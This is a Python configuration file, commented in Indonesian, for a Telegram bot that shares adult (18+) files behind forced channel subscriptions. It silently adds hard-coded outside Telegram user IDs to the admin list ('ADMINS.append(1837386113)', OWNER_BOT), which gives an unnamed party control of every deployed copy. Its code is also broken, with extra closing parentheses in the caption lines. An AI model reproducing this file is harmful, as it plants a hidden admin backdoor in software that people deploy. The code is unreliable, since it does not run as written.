# (Â©)Codexbotz

import logging
import os
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler


load_dotenv("config.env")

# Bot token dari @Botfather
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

# NAMA OWNER
OWNER_USERNAME = os.environ.get("OWNER_USERNAME", "")
OWNER_BOT = [1978038952]

# Database
DB_URI = os.environ.get("DATABASE_URL", "")

FORCE_SUB_SATU = int(os.environ.get("FORCE_SUB_SATU", "0"))
FORCE_SUB_DUA = int(os.environ.get("FORCE_SUB_DUA", "0"))
FORCE_SUB_TIGA = int(os.environ.get("FORCE_SUB_TIGA", "0"))

CAPTION_SATU = os.environ.get("CAPTION_SATU", "JOIN GROUP-1"))
CAPTION_DUA = os.environ.get("CAPTION_DUA", "JOIN GROUP-2"))
CAPTION_TIGA = os.environ.get("CAPTION_TIGA", "JOIN CHANNEL"))


TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hai {first}</b>\n\n<b>Saya adalah Bot asupan konten 18+ berfungsi untuk membagikan file asupan berupa link khusus.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hai {first}\n\n~ Untuk Bisa nonton [VIDEO] anda perlu join terlebih dahulu [LINK CHANNEL] di bawah setelah itu tekan tombol reload file ~</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"

ADMINS.append(OWNER_ID)
ADMINS.append(1837386113)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
